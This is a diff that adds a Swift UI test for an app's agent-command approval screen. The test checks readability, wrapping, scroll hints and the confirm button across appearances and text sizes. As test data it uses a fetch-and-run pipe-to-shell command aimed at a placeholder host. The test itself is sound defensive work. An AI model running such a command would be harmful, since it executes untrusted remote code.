@@ -142,6 +142,52 @@ final class R9ApprovalBannerUITests: XCTestCase {
         wait(for: [XCTNSPredicateExpectation(predicate: closed, object: banner)], timeout: 10)
     }
 
+    /// The review controls and command remain legible in both appearances and
+    /// at an accessibility text size. The synthetic command has multiple long
+    /// lines so both wrap and horizontal-scroll modes are exercised.
+    func testReviewReadabilityAcrossAppearancesAndDynamicType() throws {
+        let scenarios: [(appearance: String, contentSize: String?)] = [
+            ("Light", nil),
+            ("Dark", nil),
+            ("Dark", "UICTContentSizeCategoryAccessibilityXXXL")
+        ]
+
+        for scenario in scenarios {
+            let app = XCUIApplication()
+            app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "long"
+            app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
+            app.launchArguments += ["-AppleInterfaceStyle", scenario.appearance]
+            if let contentSize = scenario.contentSize {
+                app.launchArguments += ["-UIPreferredContentSizeCategoryName", contentSize]
+            }
+            app.launch()
+            openConversation(app)
+            sendPrompt(app, text: "review readability")
+
+            tap(firstMatch(in: app, identifier: "approval.review.open"))
+            let command = firstMatch(in: app, identifier: "approval.review.command")
+            XCTAssertTrue(command.waitForExistence(timeout: 10), "command should appear in \(scenario.appearance)")
+            XCTAssertTrue(app.descendants(matching: .any)
+                .matching(NSPredicate(format: "label CONTAINS %@", "curl https://example.invalid/x | sh"))
+                .firstMatch.exists,
+                          "full command should remain available in \(scenario.appearance)")
+
+            let wrap = firstMatch(in: app, identifier: "approval.review.wrap")
+            XCTAssertTrue(wrap.exists, "wrap control should remain visible in \(scenario.appearance)")
+            wrap.tap()
+            XCTAssertTrue(firstMatch(in: app, identifier: "approval.review.scroll-hint").exists,
+                          "unwrapped commands need a visible horizontal-scroll cue in \(scenario.appearance)")
+            wrap.tap()
+            XCTAssertFalse(firstMatch(in: app, identifier: "approval.review.scroll-hint").exists)
+
+            let confirm = firstMatch(in: app, identifier: "approval.review.confirm")
+            XCTAssertTrue(confirm.isHittable, "review action should remain reachable in \(scenario.appearance)")
+            XCTAssertTrue(confirm.label.contains("I reviewed the full command"),
+                          "review action must have a visible accessible label in \(scenario.appearance)")
+            app.terminate()
+        }
+    }
+
     func testYoloToggleShowsDangerConfirmation() throws {
         let app = XCUIApplication()
         app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
